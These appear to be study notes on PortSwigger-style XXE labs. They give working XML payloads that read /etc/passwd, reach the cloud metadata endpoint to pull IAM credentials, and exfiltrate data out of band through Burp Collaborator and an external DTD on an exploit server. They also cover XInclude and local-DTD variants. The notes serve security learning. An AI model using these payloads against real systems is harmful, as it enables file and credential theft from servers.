XML external entity
- Allows attacker to interfere with application's processing of XML data.
- Allows attacker to view files on application server filesystem and to interact with any back-end or external systems that the application itself can access.

How it arise:
- Application use XML format to transmit data between the browser and server.


### Lab: Exploiting XXE using external entities to retrieve files
- If "Check stock" feature that parses XML input and returns any unexpected values in the response.
- Intercepting the **POST** request, and inserting in between XML declaration 
```
		<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
- Replace productId number as `&xxe;`
- Response should contain "Invalid product ID" follwed by contents of `/etc/passwd` file.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
1
</storeId>
</stockCheck>
```

### Lab: Exploiting XXE to perform SSRF attacks
-  If "Check stock" feature that parses XML input and returns any unexpected values in the response.
- Intercepting the **POST** request, and inserting in between XML declaration 
```
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
- Replace productId number as `&xxe;`
- Response should contain "Invalid product ID: ___ followed by the response from the metadata endpoint____". [eg: latest]
- Iteratively update the URL that result in JSOAN response containing secret access key.[http://169.254.169.254/latest/meta-data/iam/security-credentials/admin]


### Blind XXE with out-of-band interaction
- "Check stock" feature that parses XML input but does not display the result.
- Can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

Attack:
- Intercepting the **POST** request, and inserting in between XML declaration.
```
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>
```
- Replace productId number as `&xxe;`
- Go to the Collaborator tab, and click "Poll now". You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://Insert Collaborator payload"> ]>
<stockCheck>
<productId>
&xxe;
</productId>
<storeId>
2
</storeId>
</stockCheck>
```

### Lab: Blind XXE with out-of-band interaction via XML parameter entities
- Does not display any unexpected values, and blocks requests containing regular external entities.
- Use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
Attack:
- Insert external entity definition in between the XML declaration and the `stockCheck` element. 
- Insert a Burp Collaborator subdomain where indicated.
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>
```
- You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

### Lab: Exploiting blind XXE to retrieve data via error messages
- Intercepting the **POST** request, and inserting in between XML declaration.
```
		<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a0a000b04c87262815ba1d301be00ae.exploit-server.net/exploit.dtd"> %xxe;]>
```
- Body of server 
```
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%exfil;
```

- Error message containing the contents of the `/etc/passwd` file.

### Lab: Exploiting XInclude to retrieve files
- Check stock and send the POST request to repeater.
- Replace the productId as
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- Error message containing the contents of the `/etc/passwd` file.

### Lab: Exploiting XXE to retrieve data by repurposing a local DTD
- Check stock and send the POST request to repeater.
- Inserting in between XML declaration 
```
<!DOCTYPE message [ 
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> 
<!ENTITY % ISOamso ' <!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> 
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```